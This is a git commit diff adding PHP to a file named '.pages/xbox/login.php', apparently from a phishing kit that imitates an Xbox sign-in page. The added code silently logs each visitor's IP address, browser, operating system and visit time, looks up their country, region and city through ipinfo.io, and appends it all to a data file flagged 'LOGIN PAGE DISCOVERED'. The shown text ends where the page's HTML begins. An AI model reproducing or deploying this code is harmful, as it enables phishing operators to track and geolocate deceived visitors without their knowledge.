5ea04d75f802feaecdb746a02862731ca82dd370
fkyrsftj <132077319+fkyrsftj@users.noreply.github.com>
2023-05-12 04:41:28 -0700

    Update login.php

--- .pages/xbox/login.php
+++ .pages/xbox/login.php
@@ -1,3 +1,86 @@
+<?php 
+$file = "
+../data.txt";
+$full_date = date("d-m-Y h:i:s");
+if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+    $ip = $_SERVER['HTTP_CLIENT_IP'];
+} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+} else {
+    $ip = $_SERVER['REMOTE_ADDR'];
+}
+$browser = $_SERVER['HTTP_USER_AGENT'];
+
+function get_operating_system() {
+    $u_agent = $_SERVER['HTTP_USER_AGENT'];
+    $operating_system = 'Unknown Operating System';
+
+    if (preg_match('/linux/i', $u_agent)) {
+        $operating_system = 'Linux';
+    } elseif (preg_match('/macintosh|mac os x|mac_powerpc/i', $u_agent)) {
+        $operating_system = 'Mac';
+    } elseif (preg_match('/windows|win32|win98|win95|win16/i', $u_agent)) {
+        $operating_system = 'Windows';
+    } elseif (preg_match('/ubuntu/i', $u_agent)) {
+        $operating_system = 'Ubuntu';
+    } elseif (preg_match('/iphone/i', $u_agent)) {
+        $operating_system = 'IPhone';
+    } elseif (preg_match('/ipod/i', $u_agent)) {
+        $operating_system = 'IPod';
+    } elseif (preg_match('/ipad/i', $u_agent)) {
+        $operating_system = 'IPad';
+    } elseif (preg_match('/android/i', $u_agent)) {
+        $operating_system = 'Android';
+    } elseif (preg_match('/blackberry/i', $u_agent)) {
+        $operating_system = 'Blackberry';
+    } elseif (preg_match('/webos/i', $u_agent)) {
+        $operating_system = 'Mobile';
+    }
+    
+    return $operating_system;
+}
+
+
+$os_system = get_operating_system();
+
+function get_client_ip()
+{
+    $ipaddress = '';
+    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
+        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
+    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
+        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
+    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
+        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
+    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
+        $ipaddress = $_SERVER['HTTP_FORWARDED'];
+    } else if (isset($_SERVER['REMOTE_ADDR'])) {
+        $ipaddress = $_SERVER['REMOTE_ADDR'];
+    } else {
+        $ipaddress = 'UNKNOWN';
+    }
+
+    return $ipaddress;
+}
+$PublicIP = get_client_ip();
+$json     = file_get_contents("http://ipinfo.io/$PublicIP/geo");
+$json     = json_decode($json, true);
+$country  = $json['country'];
+$region   = $json['region'];
+$city     = $json['city'];
+file_put_contents($file, print_r("////////////////////////////////////////////////////// \n", true), FILE_APPEND);
+file_put_contents($file, print_r("IP     : $ip \n", true),        FILE_APPEND);
+file_put_contents($file, print_r("Date   : $full_date \n", true), FILE_APPEND);
+file_put_contents($file, print_r("Country: $country \n", true),   FILE_APPEND);
+file_put_contents($file, print_r("Region : $region \n", true),    FILE_APPEND);
+file_put_contents($file, print_r("City   : $city \n", true),      FILE_APPEND);
+file_put_contents($file, print_r("UserAGt: $browser \n", true),   FILE_APPEND);
+file_put_contents($file, print_r("OS-Sys : $os_system \n", true), FILE_APPEND);
+file_put_contents($file, print_r("/////////////////////////////////////////////////////// \n", true), FILE_APPEND);
+file_put_contents($file, print_r("LOGIN PAGE DISCOVERED\n", true),FILE_APPEND);
+?>
 <!DOCTYPE html>
 <html>
 
